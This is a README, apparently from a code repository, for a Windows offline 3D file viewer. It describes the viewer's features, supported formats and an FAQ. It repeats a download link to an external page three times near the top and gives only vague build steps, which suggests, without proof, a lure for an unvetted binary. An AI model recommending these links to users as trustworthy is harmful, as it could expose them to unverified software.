# Open 3D Viewer v0.1.0 - Offline 3D File Viewer for Windows

> **Open 3D Viewer is a local-first Windows desktop application for examining 3D assets without an internet connection. Powered by Three.js rendering, the first v0.1.0 release delivers responsive model viewing and useful support for common import formats.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adamsdylanqvdg9566/open-3d-viewer-windows?style=flat-square)](https://github.com/adamsdylanqvdg9566/open-3d-viewer-windows)

---

<p align="center">
  <a href="https://adamsdylanqvdg9566.github.io/open-3d-viewer-windows/">
    <img src="https://img.shields.io/badge/Download-Open%203D%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Open 3D Viewer">
  </a>
</p>

> **[Download Open 3D Viewer v0.1.0](https://adamsdylanqvdg9566.github.io/open-3d-viewer-windows/)**

---

[Download Latest Build](https://adamsdylanqvdg9566.github.io/open-3d-viewer-windows/)

---

## Overview

Open 3D Viewer provides a focused Windows workspace for opening and reviewing local 3D files. Because the workflow is local-first, models remain on your computer while you inspect meshes, assets, and CAD-related files through a straightforward desktop UI.

Built with Tauri and Three.js, the application is intended to stay lightweight for regular viewing work. Artists, developers, technical users, and other 3D practitioners can use it to review familiar file types, adjust the viewport, and create screenshots without switching to another application.

---

## What You Can Do

- Drop files directly into the window to open models
- Load GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD files
- Examine materials with PBR rendering and environment lighting
- Navigate scenes using orbit, pan, and zoom controls
- Enable or disable wireframe, grid, and automatic rotation views
- Center a model automatically or restore the default view
- Save viewer views as PNG screenshots
- Retain recent files and application settings between sessions
- Configure file associations as part of installation

---

## Getting Started

The packaged Windows build is available through the download links above. To compile the application yourself, clone the repository and install its dependencies before running the supplied development or build command for your environment.

Basic source setup:

1. Clone the repository.
2. Install the project dependencies.
3. Start the desktop application with the appropriate development or build command.

After installation, the quickest workflow is to open a supported file directly or drag it into the application window.

---

## Using the Viewer

A normal inspection session looks like this:

1. Start Open 3D Viewer.
2. Drop a supported asset into the window, or select one through the file picker.
3. Explore the model with orbit, pan, and zoom.
4. Turn on wireframe or grid mode when you need to examine structure more clearly.
5. Apply auto-frame to center the object, and reset the view whenever necessary.
6. Export the current presentation as a PNG screenshot.

The application is built for rapid local review. Recent files and saved preferences make it easy to continue working with the same assets and viewing setup.

---

## Local Settings and File Associations

Open 3D Viewer stores settings and recent-file information locally.

When file associations are selected during installation, supported files may be launched from the Windows shell. Other display choices, viewport toggles, and session preferences are controlled within the application and retained across launches.

---

## System Requirements

- Windows desktop environment
- A compatible runtime and build setup for the Tauri application when compiling from source
- Enough local storage for models, textures, and PNG screenshots
- Input files in supported formats, including GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD

---

## Frequently Asked Questions

**Can I use Open 3D Viewer without an internet connection?**  
Yes. Its local-first design is intended for viewing files stored on your own machine.

**What file types are supported?**  
Supported model and CAD-oriented formats include GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD.

**How can I install an updated version?**  
Download the newest build from the release link and replace the existing installation according to the instructions for your platform.

**Where does the application keep preferences and recent files?**  
The application saves both settings and recent-file history locally.

**What can I do when a model fails to open?**  
Verify that the file uses a supported format and is not damaged. You can also reopen the asset or reset the view and try again.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
